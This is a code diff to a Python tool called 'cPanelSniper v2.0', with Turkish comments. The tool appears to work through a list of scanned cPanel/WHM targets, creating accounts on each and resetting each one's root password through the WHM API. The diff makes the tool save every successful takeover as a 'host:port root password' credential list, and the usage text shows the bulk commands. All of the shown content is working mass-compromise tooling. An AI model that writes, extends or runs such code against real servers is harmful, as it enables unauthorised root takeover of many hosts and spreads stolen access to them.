@@ -1061,26 +1061,31 @@ def run_bulk_create_accounts(args):
         f"({time.time() - t0:.1f}s)")
 
 
-def save_bulk_passwd_reports(ok_list, fail_list, path_ok, path_fail):
+def save_bulk_passwd_reports(ok_list, fail_list, path_ok, path_fail, password):
+    """Başarılar: wordlist (satır başına host:port root şifre). Hatalar: JSON."""
     ts = datetime.now().isoformat()
-    for outp, payload in (
-        (path_ok, {"kind": "bulk_passwd_success", "key": "targets_ok",
-                   "items": ok_list}),
-        (path_fail, {"kind": "bulk_passwd_failed", "key": "targets_failed",
-                      "items": fail_list}),
-    ):
-        d = os.path.dirname(os.path.abspath(outp))
-        if d:
-            os.makedirs(d, exist_ok=True)
-        with open(outp, "w", encoding="utf-8") as f:
-            json.dump({
-                "scanner": "cPanelSniper v2.0",
-                "kind": payload["kind"],
-                "timestamp": ts,
-                "count": len(payload["items"]),
-                payload["key"]: payload["items"],
-            }, f, indent=2, ensure_ascii=False)
-    log("OK", f"Root şifre güncellenen hedefler ({len(ok_list)}) → {path_ok}")
+    d_ok = os.path.dirname(os.path.abspath(path_ok))
+    if d_ok:
+        os.makedirs(d_ok, exist_ok=True)
+    with open(path_ok, "w", encoding="utf-8") as f:
+        for ent in ok_list:
+            turl = ent.get("target") or ""
+            _, host, port = parse_target(turl)
+            user = ent.get("user") or "root"
+            f.write(f"{host}:{port} {user} {password}\n")
+    log("OK", f"Root passwd OK wordlist ({len(ok_list)} satır) → {path_ok}")
+
+    d_fail = os.path.dirname(os.path.abspath(path_fail))
+    if d_fail:
+        os.makedirs(d_fail, exist_ok=True)
+    with open(path_fail, "w", encoding="utf-8") as f:
+        json.dump({
+            "scanner": "cPanelSniper v2.0",
+            "kind": "bulk_passwd_failed",
+            "timestamp": ts,
+            "count": len(fail_list),
+            "targets_failed": fail_list,
+        }, f, indent=2, ensure_ascii=False)
     log("OK", f"Başarısız passwd ({len(fail_list)}) → {path_fail}")
 
 
@@ -1095,7 +1100,7 @@ def run_bulk_passwd(args):
     print(f"{C.PURPLE}  Toplu root passwd (WHM API):{C.RESET}")
     print(f"   Kaynak       : {args.results_json}  ({len(urls)} hedef)")
     print(f"   Yeni şifre   : (uzunluk {len(args.passwd or '')})")
-    print(f"   Başarı çıktı : {args.bulk_passwd_success_out}")
+    print(f"   OK wordlist  : {args.bulk_passwd_success_out}  (host:port root şifre)")
     print(f"   Hata çıktı   : {args.bulk_passwd_fail_out}")
     print(f"   Threads      : {args.threads}")
     print()
@@ -1116,6 +1121,7 @@ def run_bulk_passwd(args):
         args._bulk_passwd_failures,
         args.bulk_passwd_success_out,
         args.bulk_passwd_fail_out,
+        args.passwd,
     )
     log("INFO",
         f"Özet: {len(args._bulk_passwd_successes)} passwd OK, "
@@ -1365,7 +1371,7 @@ Toplu yeni hesap (results.json → createacct, başarılılar ayrı dosyada):
   python3 cPanelSniper.py --results-json results.json --bulk-create-account \\
     --new-user mitsec --passwd 'P@ss2026!' --bulk-success-out bulk_accounts_ok.json
 
-Toplu root şifre (results.json → WHM passwd user=root):
+Toplu root şifre (results.json → WHM passwd; başarılar wordlist .txt):
   python3 cPanelSniper.py --results-json results.json --bulk-passwd \\
     --passwd 'P@ss2026Fikri'
         """
@@ -1400,8 +1406,8 @@ Toplu root şifre (results.json → WHM passwd user=root):
                     help="Başarısız createacct JSON (default: bulk_accounts_fail.json)")
     bg.add_argument("--bulk-passwd", action="store_true",
                     help="Her hedefte root passwd API (--passwd ile yeni şifre)")
-    bg.add_argument("--bulk-passwd-success-out", default="bulk_passwd_ok.json",
-                    help="passwd başarılı hedefler JSON")
+    bg.add_argument("--bulk-passwd-success-out", default="bulk_passwd_ok.txt",
+                    help="Başarılı passwd wordlist: host:port root şifre (satır başına)")
     bg.add_argument("--bulk-passwd-fail-out", default="bulk_passwd_fail.json",
                     help="passwd başarısız hedefler JSON")
 
